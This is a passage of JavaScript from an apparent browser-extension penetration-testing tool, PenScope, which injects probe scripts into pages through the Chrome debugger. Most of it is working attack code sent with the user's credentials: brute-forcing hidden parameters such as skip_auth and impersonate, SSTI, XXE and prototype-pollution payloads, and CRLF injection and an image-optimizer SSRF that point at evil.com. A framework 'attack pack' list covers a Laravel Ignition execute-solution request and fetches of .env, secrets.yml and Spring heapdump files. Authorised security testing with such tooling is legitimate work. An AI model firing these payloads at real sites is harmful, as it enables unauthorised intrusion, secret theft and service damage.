    (sm.endpoints||[]).forEach(function(ep){addSeed(ep.path,"sourcemap");});
  });
  // From suffix brute hits (only 2xx — 401/403 means auth-gated, already tested)
  (R.suffixes||[]).forEach(function(s){if(s.status===200)addSeed(s.path,"suffix-brute");});
  // From passive-discovered routes passed in via ctx
  (ctx.discoveredApis||[]).forEach(function(r){addSeed(r.path,"discovered");});
  // From well-known path probes that came back interesting
  (R.probes||[]).forEach(function(p){if(p.interesting&&p.status===200&&p.path)addSeed(p.path,"well-known");});
  // From GraphQL query fields — probe /graphql with the query
  if(R.graphql&&R.graphql.endpoint&&(R.graphql.queryFields||[]).length){
    // handled separately below as POST requests
  }
  R.recursiveProbe.seedCount=Object.keys(seedUrls).length;
  R.errors.push("Recursive seed: "+R.recursiveProbe.seedCount+" URLs (filtered from prior steps)");
  // Budget per aggro level
  var waveBudgets={careful:[20,15,10],medium:[40,25,15],full:[60,40,25]};
  var budgets=waveBudgets[ctx.aggroLevel]||waveBudgets.medium;
  // === WAVE 1: probe seeds ===
  var wave1List=Object.keys(seedUrls).slice(0,budgets[0]);
  R.recursiveProbe.skippedCount=R.recursiveProbe.seedCount-wave1List.length;
  for(var wi1=0;wi1<wave1List.length;wi1++){
    var r1=await recursiveHit(wave1List[wi1],1);
    if(r1)R.recursiveProbe.wave1.push(r1);
    if(wi1%4===3)await delay(120);
  }
  // === WAVE 2: probe newUrls found in wave 1 responses ===
  var wave2Set={};
  R.recursiveProbe.wave1.forEach(function(r){
    (r.newUrls||[]).forEach(function(u){if(shouldProbe(u)&&!probedInRecursive[u]&&!wave2Set[u])wave2Set[u]=1;});
  });
  var wave2List=Object.keys(wave2Set).slice(0,budgets[1]);
  R.errors.push("Recursive wave 2: "+wave2List.length+" new URLs from wave 1");
  for(var wi2=0;wi2<wave2List.length;wi2++){
    var r2=await recursiveHit(wave2List[wi2],2);
    if(r2)R.recursiveProbe.wave2.push(r2);
    if(wi2%4===3)await delay(120);
  }
  // === WAVE 3: probe newUrls found in wave 2 responses ===
  var wave3Set={};
  R.recursiveProbe.wave2.forEach(function(r){
    (r.newUrls||[]).forEach(function(u){if(shouldProbe(u)&&!probedInRecursive[u]&&!wave3Set[u])wave3Set[u]=1;});
  });
  var wave3List=Object.keys(wave3Set).slice(0,budgets[2]);
  R.errors.push("Recursive wave 3: "+wave3List.length+" new URLs from wave 2");
  for(var wi3=0;wi3<wave3List.length;wi3++){
    var r3=await recursiveHit(wave3List[wi3],3);
    if(r3)R.recursiveProbe.wave3.push(r3);
    if(wi3%4===3)await delay(120);
  }
  // === BONUS: GraphQL query field probing ===
  // If introspection succeeded, try each query field with an empty body {query:"{fieldName}"}
  // to discover which ones don't require auth or arguments.
  if(R.graphql&&R.graphql.endpoint&&(R.graphql.queryFields||[]).length){
    var gqlUrl=R.graphql.endpoint.charAt(0)==="/"?(location.origin+R.graphql.endpoint):R.graphql.endpoint;
    var fields=R.graphql.queryFields.slice(0,15);
    for(var gfi=0;gfi<fields.length;gfi++){
      var fname=fields[gfi].name;
      if(!fname)continue;
      try{
        var gResp=await sf(gqlUrl,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({query:"{"+fname+"{__typename}}"})},100000);
        if(gResp.status<400&&gResp.body.indexOf('"errors"')===-1&&gResp.body.length>20){
          var gFindings=scanBodyForFindings(gResp.body);
          R.recursiveProbe.wave1.push({
            path:"GraphQL:"+fname,
            url:gqlUrl,
            status:gResp.status,
            size:gResp.body.length,
            contentType:gResp.ct,
            bodyPreview:gResp.body.substring(0,600),
            newUrls:[],
            findings:gFindings,
            wave:1,
            isGraphQL:true
          });
        }
      }catch(e){}
      if(gfi%3===2)await delay(150);
    }
  }
  R.recursiveProbe.totalDiscovered=R.recursiveProbe.wave1.length+R.recursiveProbe.wave2.length+R.recursiveProbe.wave3.length;
  R.recursiveProbe.newUrlsFound=Object.keys(wave2Set).length+Object.keys(wave3Set).length;
  R.errors.push("Recursive probe done: "+R.recursiveProbe.totalDiscovered+" endpoints probed, "+R.recursiveProbe.newUrlsFound+" new URLs discovered in responses");
}

R.errors.push("STEP 29: Storage Partition Test");
if(ctx.aggroLevel==="full"){
  try{
    var storageTests=[];
    try{
      var testKey="__ps_partition_"+Date.now();
      localStorage.setItem(testKey,"1");
      var canRead=localStorage.getItem(testKey)==="1";
      localStorage.removeItem(testKey);
      storageTests.push({type:"localStorage",accessible:canRead,partitioned:false});
    }catch(e){storageTests.push({type:"localStorage",accessible:false,partitioned:true,error:e.message});}
    try{
      var testKey2="__ps_partition_"+Date.now();
      sessionStorage.setItem(testKey2,"1");
      var canRead2=sessionStorage.getItem(testKey2)==="1";
      sessionStorage.removeItem(testKey2);
      storageTests.push({type:"sessionStorage",accessible:canRead2,partitioned:false});
    }catch(e){storageTests.push({type:"sessionStorage",accessible:false,partitioned:true,error:e.message});}
    try{
      var cacheAvail=typeof caches!=="undefined";
      if(cacheAvail){
        var tc=await caches.open("__ps_test");
        await tc.put(new Request("/__ps_test"),new Response("1"));
        var tr=await tc.match(new Request("/__ps_test"));
        var canReadCache=!!tr;
        await caches.delete("__ps_test");
        storageTests.push({type:"CacheAPI",accessible:canReadCache,partitioned:false});
      }
    }catch(e){storageTests.push({type:"CacheAPI",accessible:false,partitioned:true,error:e.message});}
    try{
      var idbAvail=typeof indexedDB!=="undefined";
      if(idbAvail){
        var idbTest=await new Promise(function(resolve){
          var req=indexedDB.open("__ps_test",1);
          req.onsuccess=function(){req.result.close();indexedDB.deleteDatabase("__ps_test");resolve(true);};
          req.onerror=function(){resolve(false);};
          req.onblocked=function(){resolve(false);};
          setTimeout(function(){resolve(false);},3000);
        });
        storageTests.push({type:"IndexedDB",accessible:idbTest,partitioned:!idbTest});
      }
    }catch(e){storageTests.push({type:"IndexedDB",accessible:false,partitioned:true,error:e.message});}
    var anyPartitioned=storageTests.some(function(t){return t.partitioned;});
    R.storagePartition=storageTests;
    if(anyPartitioned){
      R.storagePartition.push({type:"summary",severity:"medium",note:"Some storage APIs are partitioned \u2014 cross-site tracking is restricted but data isolation may leak via timing"});
    }else{
      R.storagePartition.push({type:"summary",severity:"info",note:"All storage APIs accessible \u2014 no partitioning detected in current context"});
    }
  }catch(e){R.errors.push("Storage partition: "+e.message);}
}

// =====================================================================
// v5.9: EXTENDED ATTACK COVERAGE — 6 new probe steps (31-36)
// =====================================================================

// ===== STEP 31: Parameter Discovery =====
// Brute-force common hidden parameters on discovered endpoints. Many APIs have debug/admin/
// verbose flags that change response content without being documented. This reaches parts
// swagger specs never mention.
R.errors.push("STEP 31: Parameter Discovery");
R.paramDiscovery=[];
if(ctx.aggroLevel!=="careful"){
  var paramWordlist=["debug","test","admin","dev","staging","verbose","full","raw","internal","include","fields","expand","details","trace","source","export","format","pretty","draft","unpublished","hidden","private","all","force","skip_auth","noauth","bypass","role","impersonate","user_id","userid","as_user","view_as","_method","auth","token","api_key","secret","limit","offset","page","per_page"];
  var paramTestValues={"debug":"true","test":"1","admin":"true","verbose":"1","format":"json","limit":"1000","bypass":"1","role":"admin","_method":"DELETE"};
  var paramTargets=ctx.observedApis.filter(function(e){return e.method==="GET"&&e.path.indexOf("/api/")>-1;}).slice(0,8);
  for(var pdi=0;pdi<paramTargets.length;pdi++){
    var pdEp=paramTargets[pdi];
    try{
      var baseResp=await sf(location.origin+pdEp.path+(pdEp.query||""),null,8000);
      if(baseResp.status!==200)continue;
      var baseSize=baseResp.body.length;
      var discovered=[];
      for(var pwi=0;pwi<paramWordlist.length;pwi++){
        var param=paramWordlist[pwi];
        var val=paramTestValues[param]||"1";
        var sep=pdEp.query?"&":"?";
        try{
          var testResp=await sf(location.origin+pdEp.path+(pdEp.query||"")+sep+param+"="+encodeURIComponent(val),null,8000);
          if(testResp.status===200&&Math.abs(testResp.body.length-baseSize)>50){
            discovered.push({param:param,value:val,baseSize:baseSize,testSize:testResp.body.length,delta:testResp.body.length-baseSize});
          }
        }catch(e){}
        if(pwi%8===7)await delay(80);
      }
      if(discovered.length){
        R.paramDiscovery.push({path:pdEp.path,method:"GET",baseStatus:200,baseSize:baseSize,discovered:discovered,severity:discovered.length>=3?"high":"medium",note:discovered.length+" hidden parameter(s) change response size"});
      }
    }catch(e){R.errors.push("ParamDisc "+pdEp.path+": "+e.message);}
  }
}

// ===== STEP 32: SSTI (Server-Side Template Injection) =====
// Injects 6 template syntaxes into discovered query parameters. A reflected response containing
// "49" indicates one of the payloads evaluated ({{7*7}} → 49). Rare but catastrophic when found.
R.errors.push("STEP 32: SSTI Probing");
R.sstiResults=[];
if(ctx.aggroLevel!=="careful"){
  // Each literal dollar-brace sequence in these payloads must be escaped with a backslash,
  // otherwise the OUTER background.js template literal interpolates it at module load and the
  // payload is either silently replaced by a computed value or causes a compile error.
  var sstiPayloads=[
    {p:"{{7*7}}",expect:"49",engine:"Jinja2/Twig"},
    {p:"\${7*7}",expect:"49",engine:"FreeMarker/Spring"},
    {p:"<%=7*7%>",expect:"49",engine:"ERB/EJS"},
    {p:"#{7*7}",expect:"49",engine:"Ruby/Pug"},
    {p:"{{7*'7'}}",expect:"7777777",engine:"Jinja2"},
    {p:"\${{7*7}}",expect:"49",engine:"Handlebars"}
  ];
  var sstiTargets=ctx.observedApis.filter(function(e){return e.query&&e.query.length>2;}).slice(0,10);
  for(var sti=0;sti<sstiTargets.length;sti++){
    var stEp=sstiTargets[sti];
    var params=new URLSearchParams(stEp.query);
    var paramList=[];params.forEach(function(v,k){paramList.push(k);});
    if(!paramList.length)continue;
    var paramKey=paramList[0];
    for(var spi=0;spi<sstiPayloads.length;spi++){
      var payload=sstiPayloads[spi];
      var modParams=new URLSearchParams(stEp.query);
      modParams.set(paramKey,payload.p);
      try{
        var sResp=await sf(location.origin+stEp.path+"?"+modParams.toString(),null,8000);
        if(sResp.body&&sResp.body.indexOf(payload.expect)>-1&&sResp.body.indexOf(payload.p)===-1){
          R.sstiResults.push({path:stEp.path,param:paramKey,payload:payload.p,engine:payload.engine,expected:payload.expect,status:sResp.status,severity:"critical",note:"Payload evaluated to "+payload.expect+" — template injection confirmed"});
        }
      }catch(e){}
      if(spi%3===2)await delay(100);
    }
  }
}

// ===== STEP 33: XXE (XML External Entity) =====
// Posts a malicious XML document to endpoints that accept XML content-types. A 500 error
// with "DOCTYPE" in the message, or response containing /etc/passwd contents, confirms XXE.
R.errors.push("STEP 33: XXE Probing");
R.xxeResults=[];
if(ctx.aggroLevel==="medium"||ctx.aggroLevel==="full"){
  var xxePayload='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test "PENSCOPE_XXE">]><root>&test;</root>';
  var xxeOobPayload='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://example.invalid/ps">%ext;]><root></root>';
  // Target endpoints that accept XML (either by content-type or by naming)
  var xxeTargets=ctx.postBodiesCtx.filter(function(p){return(p.contentType||"").indexOf("xml")>-1;}).slice(0,6);
  if(!xxeTargets.length){
    // Fall back: any POST endpoint; try switching content-type to XML
    xxeTargets=ctx.observedApis.filter(function(e){return e.method==="POST";}).slice(0,5).map(function(e){return{path:e.path,url:location.origin+e.path,contentType:"application/xml"};});
  }
  for(var xi=0;xi<xxeTargets.length;xi++){
    var xEp=xxeTargets[xi];
    var xUrl=xEp.url||(location.origin+xEp.path);
    try{
      var xResp=await sf(xUrl,{method:"POST",headers:{"Content-Type":"application/xml"},body:xxePayload},10000);
      var reflected=xResp.body&&xResp.body.indexOf("PENSCOPE_XXE")>-1;
      var parsed=xResp.status!==415&&xResp.status!==400;
      if(reflected){
        R.xxeResults.push({path:xEp.path,payload:"inline entity",status:xResp.status,reflected:true,severity:"critical",note:"Inline XML entity expanded in response — XXE confirmed"});
      }else if(parsed&&xResp.status<500){
        R.xxeResults.push({path:xEp.path,payload:"inline entity",status:xResp.status,reflected:false,severity:"info",note:"XML parser accepted payload (status "+xResp.status+") but entity was not reflected — may still be OOB-exploitable"});
      }
    }catch(e){}
    if(xi%3===2)await delay(120);
  }
}

// ===== STEP 34: CRLF / Header Injection =====
// Injects %0d%0aX-Injected: 1 into redirect and location-related parameters. If the server
// reflects the header in its response headers, we have a header-injection vulnerability
// usable for response splitting, session fixation, and cache poisoning.
R.errors.push("STEP 34: CRLF Injection");
R.crlfResults=[];
if(ctx.aggroLevel!=="careful"){
  var crlfParams=["redirect","redirect_url","return","url","next","goto","callback","location","returnTo","continue","forward","dest","page"];
  var crlfPayload="%0d%0aX-PenScope-Injected:%20true";
  var crlfTargets=ctx.observedApis.filter(function(e){
    if(!e.query)return false;
    var lower=(e.path+e.query).toLowerCase();
    return crlfParams.some(function(p){return lower.indexOf(p)>-1;});
  }).slice(0,8);
  for(var cri=0;cri<crlfTargets.length;cri++){
    var crEp=crlfTargets[cri];
    var params=new URLSearchParams(crEp.query);
    var crParamName=null;
    for(var cpn=0;cpn<crlfParams.length;cpn++){if(params.has(crlfParams[cpn])){crParamName=crlfParams[cpn];break;}}
    if(!crParamName)continue;
    try{
      params.set(crParamName,"https://evil.com/"+crlfPayload);
      // Use raw fetch to inspect headers
      var crc=new AbortController();
      var crt=setTimeout(function(){crc.abort();},8000);
      R.requests++;
      var crResp=await fetch(location.origin+crEp.path+"?"+params.toString(),{method:"GET",redirect:"manual",signal:crc.signal,credentials:"include",headers:mergeCustomHeaders(null)});
      clearTimeout(crt);
      var injected=crResp.headers.get("X-PenScope-Injected")||crResp.headers.get("x-penscope-injected");
      if(injected){
        R.crlfResults.push({path:crEp.path,param:crParamName,status:crResp.status,severity:"critical",note:"X-PenScope-Injected header reflected in response — CRLF injection confirmed"});
      }
    }catch(e){}
    if(cri%3===2)await delay(100);
  }
}

// ===== STEP 35: API Version Enumeration =====
// Actively probes v1, v2, v3 downgrades for any observed /vN/ endpoint. Older API versions
// often lack modern auth enforcement, rate limiting, or parameter validation.
R.errors.push("STEP 35: API Version Downgrade");
R.versionDowngrade=[];
if(ctx.aggroLevel!=="careful"){
  var versionRe=new RegExp(ctx._re.version.src,ctx._re.version.f);
  var versioned=ctx.observedApis.filter(function(e){return versionRe.test(e.path);}).slice(0,8);
  for(var vdi=0;vdi<versioned.length;vdi++){
    var vEp=versioned[vdi];
    var match=vEp.path.match(versionRe);
    if(!match)continue;
    var currentVer=parseInt(match[1]);
    if(currentVer<2)continue;
    var altPaths=[];
    for(var v=1;v<currentVer;v++)altPaths.push(vEp.path.replace(versionRe,"/v"+v+"/"));
    for(var api=0;api<altPaths.length;api++){
      try{
        var vResp=await sf(location.origin+altPaths[api],null,10000);
        if(vResp.status<400&&vResp.body.length>20){
          R.versionDowngrade.push({originalPath:vEp.path,downgradedPath:altPaths[api],originalVersion:currentVer,testedVersion:parseInt(altPaths[api].match(versionRe)[1]),status:vResp.status,size:vResp.body.length,severity:"medium",note:"Older API version still reachable — test for weaker auth"});
        }
      }catch(e){}
      if(api%3===2)await delay(80);
    }
  }
}

// ===== STEP 36: Proto Pollution Exploitation =====
// Targets JSON endpoints that merge request bodies into objects. Sends a payload with a literal
// "__proto__" key AND a "constructor.prototype" key. Tests whether the polluted attribute
// appears in subsequent responses.
//
// IMPORTANT: JavaScript forbids creating a JSON-serializable "__proto__" property via normal
// object assignment — setting obj.__proto__ targets the prototype chain, which JSON.stringify
// ignores. So we build the polluted JSON via string manipulation — this produces a REAL string
// key that the server parser sees as "__proto__" and merges into Object.prototype if vulnerable.
R.errors.push("STEP 36: Proto Pollution Exploitation");
R.protoPollution=[];
if(ctx.aggroLevel==="full"){
  var ppTargets=ctx.postBodiesCtx.filter(function(p){
    if(!p.body||(p.contentType||"").indexOf("json")===-1)return false;
    try{var j=JSON.parse(p.body);return j&&typeof j==="object"&&!Array.isArray(j);}catch(e){return false;}
  }).slice(0,5);
  for(var ppi=0;ppi<ppTargets.length;ppi++){
    var ppEp=ppTargets[ppi];
    var ppUrl=ppEp.url||(location.origin+ppEp.path);
    try{
      // Re-serialize the body to get a clean canonical form, then inject literal __proto__ keys
      // via string surgery. The injection goes INSIDE the outermost object.
      var ppCanonical=JSON.stringify(JSON.parse(ppEp.body));
      var pollutionFrag='"__proto__":{"pensCopePolluted":"PP_MARKER"},"constructor":{"prototype":{"pensCopePolluted2":"PP_MARKER2"}}';
      var pollutedBody;
      if(ppCanonical==="{}"){
        pollutedBody="{"+pollutionFrag+"}";
      }else if(ppCanonical.charAt(ppCanonical.length-1)==="}"){
        // Insert the fragment just before the closing brace, with a leading comma since the
        // original object has at least one field (we already handled the empty case).
        pollutedBody=ppCanonical.substring(0,ppCanonical.length-1)+","+pollutionFrag+"}";
      }else{
        continue;
      }
      var ppResp=await sf(ppUrl,{method:ppEp.method||"POST",headers:{"Content-Type":"application/json"},body:pollutedBody},10000);
      if(ppResp.body&&(ppResp.body.indexOf("PP_MARKER")>-1||ppResp.body.indexOf("pensCopePolluted")>-1)){
        R.protoPollution.push({path:ppEp.path,status:ppResp.status,severity:"critical",note:"Injected __proto__ property reflected in response — prototype pollution confirmed"});
      }else if(ppResp.status>=500&&ppResp.body.indexOf("proto")>-1){
        R.protoPollution.push({path:ppEp.path,status:ppResp.status,severity:"medium",note:"500 after __proto__ injection with 'proto' in error — possible pollution trigger; try the DoS variant"});
      }else if(ppResp.status===400||ppResp.status===422){
        R.protoPollution.push({path:ppEp.path,status:ppResp.status,severity:"info",note:"Parser rejected __proto__ payload ("+ppResp.status+") — likely sanitized"});
      }
    }catch(e){R.errors.push("ProtoPoll "+ppEp.path+": "+e.message);}
    if(ppi%2===1)await delay(120);
  }
}

}catch(topErr){
  R.errors.push("FATAL: "+topErr.message+" at "+(topErr.stack||"").substring(0,200));
}
return JSON.stringify(R);
})()`;

  return new Promise(resolve=>{
    // Inject ctx as window property first — pure JSON.stringify, no escaping needed
    // Phase 1: Serialize ctx
    let setupExpr;
    try{
      const ctxStr=JSON.stringify(ctx);
      setupExpr='window.__ps_ctx='+ctxStr+';void 0';
      console.log('[PenScope Probe] ctx serialized OK, length='+ctxStr.length+', setupExpr length='+setupExpr.length);
    }catch(e){
      const err="PROBE FAIL [Phase 1: ctx serialize]: "+e.message;
      console.error('[PenScope]',err);
      tab.probeData.status="error";tab.probeData.error=err;resolve(tab.probeData);return;
    }
    // Phase 2: Inject ctx into page
    console.log('[PenScope Probe] Phase 2: injecting ctx via Runtime.evaluate ('+setupExpr.length+' chars)');
    chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{expression:setupExpr,returnByValue:true},(setupResult)=>{
    if(chrome.runtime.lastError){
      const err="PROBE FAIL [Phase 2: ctx injection chrome error]: "+JSON.stringify(chrome.runtime.lastError);
      console.error('[PenScope]',err);
      tab.probeData.status="error";tab.probeData.error=err;resolve(tab.probeData);return;
    }
    if(setupResult?.exceptionDetails){
      const ex=setupResult.exceptionDetails;
      const err="PROBE FAIL [Phase 2: ctx injection JS exception]: "+(ex.text||"unknown")+" | "+(ex.exception?.description||ex.exception?.value||"no description")+" | line="+(ex.lineNumber||"?")+" col="+(ex.columnNumber||"?");
      console.error('[PenScope]',err);
      tab.probeData.status="error";tab.probeData.error=err;resolve(tab.probeData);return;
    }
    console.log('[PenScope Probe] Phase 2 OK, ctx injected. Phase 3: running eval script ('+evalScript.length+' chars)');
    // Phase 3: Run the probe eval script
    chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{
      expression:evalScript,
      awaitPromise:true,
      returnByValue:true,
      timeout:180000
    },(result)=>{
      if(chrome.runtime.lastError){
        const err="PROBE FAIL [Phase 3: eval chrome error]: "+JSON.stringify(chrome.runtime.lastError);
        console.error('[PenScope]',err);
        tab.probeData.status="error";tab.probeData.error=err;resolve(tab.probeData);return;
      }
      if(result?.exceptionDetails){
        const ex=result.exceptionDetails;
        const err="PROBE FAIL [Phase 3: eval JS exception]: "
          +"text="+(ex.text||"none")
          +" | description="+(ex.exception?.description||ex.exception?.value||"none").substring(0,500)
          +" | line="+(ex.lineNumber||"?")
          +" | col="+(ex.columnNumber||"?")
          +" | scriptId="+(ex.scriptId||"?")
          +" | stackTrace="+JSON.stringify(ex.stackTrace||{}).substring(0,500)
          +" | evalScript.length="+evalScript.length
          +" | evalScript[0:100]="+evalScript.substring(0,100)
          +" | evalScript[-100:]="+evalScript.substring(evalScript.length-100);
        console.error('[PenScope]',err);
        tab.probeData.status="error";tab.probeData.error=err;resolve(tab.probeData);return;
      }
      if(!result||!result.result||!result.result.value){
        const err="PROBE FAIL [Phase 3: no result]: type="+(result?.result?.type||"?")+" subtype="+(result?.result?.subtype||"?")+" value="+(result?.result?.value===undefined?"undefined":result?.result?.value===null?"null":"'"+String(result?.result?.value).substring(0,100)+"'");
        console.error('[PenScope]',err);
        tab.probeData.status="error";tab.probeData.error=err;resolve(tab.probeData);return;
      }
      try{
        const data=JSON.parse(result.result.value);
        tab.probeData={...data,status:"done",startTime:tab.probeData.startTime,endTime:Date.now()};
        // Merge discovered endpoints into discoveredRoutes
        // From GraphQL
        if(data.graphql){
          (data.graphql.queryFields||[]).forEach(f=>{if(!seen(tabId,"dr","gql-q:"+f.name))tab.discoveredRoutes.push({path:f.name,source:"graphql-introspection-query",type:"query",context:""});});
          (data.graphql.mutationFields||[]).forEach(f=>{if(!seen(tabId,"dr","gql-m:"+f.name))tab.discoveredRoutes.push({path:f.name,source:"graphql-introspection-mutation",type:"mutation",context:""});});
        }
        // From source maps + secrets + harvested maps
        (data.sourceMaps||[]).forEach(sm=>{
          (sm.endpoints||[]).forEach(ep=>{if(!seen(tabId,"dr","sm:"+ep.path))tab.discoveredRoutes.push({path:ep.path,source:"sourcemap-content",type:"endpoint",context:ep.file||""});});
          (sm.secrets||[]).forEach(s=>{if(!seen(tabId,"smsec",s.type+":"+s.value.substring(0,30)))tab.secrets.push({type:s.type,value:s.value,severity:"high",source:"sourcemap:"+s.file,context:s.context||""});});
          tab.harvestedMaps.push({url:sm.url,fileCount:sm.fileCount,sources:sm.sources||[],endpoints:sm.endpoints||[],secrets:sm.secrets||[],size:sm.size||0,timestamp:Date.now()});
        });
        // From swagger
        (data.swagger||[]).forEach(sw=>{
          (sw.paths||[]).forEach(p=>{if(!seen(tabId,"dr","sw:"+p.path))tab.discoveredRoutes.push({path:p.path,source:"swagger-spec",type:p.methods.join(","),context:p.summary||""});});
        });
        // From probes (successful ones become discovered endpoints)
        (data.probes||[]).forEach(p=>{if(p.interesting&&p.path&&!seen(tabId,"dr","probe:"+p.path))tab.discoveredRoutes.push({path:p.path,source:"active-probe",type:"probed-"+p.status,context:""});});
        // From suffix brute
        (data.suffixes||[]).forEach(s=>{if(!seen(tabId,"dr","suf:"+s.path))tab.discoveredRoutes.push({path:s.path,source:"suffix-bruteforce",type:"probed-"+s.status,context:"from "+s.fromPrefix});});
        // v5.4: Merge gRPC reflection results
        if(data.grpcReflection)tab.grpcReflection=data.grpcReflection;
        // v5.4: Merge compression results
        if(data.compressionResults?.length)tab.compressionResults=data.compressionResults;
        if(data.wsHijackResults?.length)tab.wsHijackResults=data.wsHijackResults;
        if(data.cachePoisonProbe?.length)tab.cachePoisonProbe=data.cachePoisonProbe;
        if(data.timingOracle?.length)tab.timingOracle=data.timingOracle;
        if(data.coopCoepBypass?.length&&!tab.coopCoepInfo)tab.coopCoepInfo={probeResults:data.coopCoepBypass};
        if(data.storagePartition?.length)tab.storagePartition=data.storagePartition;
        // v5.9: new probe steps 31-36 results land directly in probeData (no dedicated tab field)
        // They're rendered in the Deep tab under "Probe Results"; the chain correlator will pick
        // them up too via tab.probeData.
        // v5.7: Merge recursive probe results — feed discovered URLs back into routes and
        // findings back into the main Secrets list. This closes the loop so recursive probing
        // actually contributes to the final report instead of sitting in a parallel silo.
        if(data.recursiveProbe){
          const allWaves=[...(data.recursiveProbe.wave1||[]),...(data.recursiveProbe.wave2||[]),...(data.recursiveProbe.wave3||[])];
          allWaves.forEach(r=>{
            // Each hit becomes a discovered route (if it's a new path)
            if(r.path&&r.path.charAt(0)==="/"&&!seen(tabId,"dr","rec:"+r.path)){
              tab.discoveredRoutes.push({path:r.path,source:"recursive-probe-wave"+r.wave,type:"probed-"+r.status,context:`${r.size}B ${r.contentType||""}`.trim(),observed:true});
            }
            // Every URL extracted FROM a response becomes a discovered route too
            (r.newUrls||[]).forEach(u=>{
              if(!seen(tabId,"dr","recnew:"+u))tab.discoveredRoutes.push({path:u,source:"recursive-response-scrape",type:"endpoint",context:"extracted from "+(r.path||"")});
            });
            // Findings bubble up to the Secrets tab
            (r.findings||[]).forEach(f=>{
              const fp="recfind:"+f.type+":"+String(f.value).substring(0,40);
              if(!seen(tabId,"secrec",fp)){
                tab.secrets.push({type:f.type+" (probe)",value:String(f.value),severity:f.severity||"medium",source:"recursive:"+(r.path||""),context:`${r.status} ${r.contentType||""}`.trim()});
              }
            });
          });
        }
        // v6.0 — Stack-aware attack packs (Red mode only). After step 36 completes,
        // walk tab.techStack, normalize each name to a pack key, and run any matching
        // packs. Fire-and-forget so the main probe resolves immediately; packs update
        // tab.stackAttacks asynchronously and trigger their own markDirty when done.
        // Classic mode skips this block entirely — packs are red-mode-specific.
        if(tab.mode==="red"){
          runStackAttacks(tabId,customHeaders,stealth,aggroLevel).then(()=>{
            markDirty(tabId);
          }).catch(e=>console.warn("[PenScope] stack attacks",e&&e.message||e));
        }
        markDirty(tabId);
        resolve(tab.probeData);
      }catch(e){
        tab.probeData.status="error";
        tab.probeData.error="Parse failed: "+e.message;
        resolve(tab.probeData);
      }
    });
    });// close setupExpr callback
  });
}

// v6.0 — STACK_ATTACK_PACKS dictionary. Mirror of red-attacks.js. When you add a pack
// here, also add it to red-attacks.js so external tooling can read it standalone.
//
// Schema: each step is {step, method, path, body?, expect?, severity?, custom?}. The
// runner POSTs/GETs each path with credentials:'include' + custom headers, then checks
// the response: if `expect` substring matches in body, mark the step as confirmed at
// the given severity (default "medium"). For `custom` steps with no path, a special
// branch in the runner handles them (e.g. graphql field fuzzing using the symbol table).
const STACK_ATTACK_PACKS={
  laravel:[
    {step:"laravel-debug",method:"GET",path:"/?XDEBUG_SESSION_START=1",expect:["whoops","Stack trace"]},
    {step:"laravel-ignition",method:"POST",path:"/_ignition/execute-solution",body:{solution:"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",parameters:{viewFile:"phpinfo()",variableName:"a"}},severity:"critical"},
    {step:"laravel-telescope",method:"GET",path:"/telescope",expect:["<title>Telescope"]},
    {step:"laravel-horizon",method:"GET",path:"/horizon",expect:["Horizon"]},
    {step:"laravel-env",method:"GET",path:"/.env",expect:["APP_KEY=","DB_PASSWORD"],severity:"critical"},
    {step:"laravel-storage",method:"GET",path:"/storage/logs/laravel.log"},
    {step:"laravel-debugbar",method:"GET",path:"/_debugbar/open",expect:["debugbar"]},
  ],
  spring:[
    {step:"spring-actuator",method:"GET",path:"/actuator"},
    {step:"spring-heapdump",method:"GET",path:"/actuator/heapdump",severity:"critical"},
    {step:"spring-env",method:"GET",path:"/actuator/env"},
    {step:"spring-mappings",method:"GET",path:"/actuator/mappings"},
    {step:"spring-trace",method:"GET",path:"/actuator/trace"},
    {step:"spring-jolokia",method:"GET",path:"/jolokia/list"},
    {step:"spring-h2-console",method:"GET",path:"/h2-console"},
    {step:"spring-loggers",method:"GET",path:"/actuator/loggers"},
    {step:"spring-beans",method:"GET",path:"/actuator/beans"},
  ],
  rails:[
    {step:"rails-secrets",method:"GET",path:"/config/secrets.yml",severity:"critical"},
    {step:"rails-routes",method:"GET",path:"/rails/info/routes"},
    {step:"rails-properties",method:"GET",path:"/rails/info/properties"},
    {step:"rails-dj-console",method:"GET",path:"/admin/jobs"},
    {step:"rails-database",method:"GET",path:"/config/database.yml",severity:"critical"},
  ],
  aspnet:[
    {step:"aspnet-trace",method:"GET",path:"/trace.axd"},
    {step:"aspnet-elmah",method:"GET",path:"/elmah.axd"},
    {step:"aspnet-debug",method:"GET",path:"/?DEBUG=1"},
    {step:"aspnet-bin",method:"GET",path:"/bin/"},
    {step:"aspnet-webconfig",method:"GET",path:"/web.config"},
  ],
  django:[
    {step:"django-debug",method:"GET",path:"/?debug=1",expect:["Django","DEBUG = True"]},
    {step:"django-admin",method:"GET",path:"/admin/"},
    {step:"django-static",method:"GET",path:"/static/admin/css/base.css"},
    {step:"django-traceback",method:"GET",path:"/__debug__/",custom:"trigger-500-look-for-traceback"},
  ],
  nextjs:[
    {step:"nextjs-build-manifest",method:"GET",path:"/_next/static/development/_buildManifest.js"},
    {step:"nextjs-data",method:"GET",path:"/_next/data/"},
    {step:"nextjs-image",method:"GET",path:"/_next/image?url=https%3A%2F%2Fevil.com%2Fimg.png&w=64&q=75",custom:"check-image-optimizer-ssrf"},
  ],
  graphql:[
    {step:"graphql-introspect",method:"POST",path:"/graphql",body:{query:"{__schema{queryType{name} mutationType{name} types{name kind}}}"}},
    {step:"graphql-batching",method:"POST",path:"/graphql",body:[{query:"{__typename}"},{query:"{__typename}"}],custom:"send-array-of-queries"},
    {step:"graphql-field-fuzz",method:"POST",path:"/graphql",custom:"use-symbol-table-as-field-dict"},
  ],
  wordpress:[
    {step:"wp-rest-users",method:"GET",path:"/wp-json/wp/v2/users"},
    {step:"wp-xmlrpc",method:"POST",path:"/xmlrpc.php",body:'<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'},
    {step:"wp-readme",method:"GET",path:"/readme.html"},
    {step:"wp-admin-ajax",method:"GET",path:"/wp-admin/admin-ajax.php?action="},
  ],
};

// Normalize tech-stack name (e.g. "Laravel 9.x", "Spring Boot 2.7", "ASP.NET MVC")
// to a STACK_ATTACK_PACKS key. Returns null when no pack matches.
function mapStackKey(name){
  if(!name)return null;
  const n=String(name).toLowerCase();
  if(/laravel/.test(n))return "laravel";
  if(/spring|java/.test(n))return "spring";
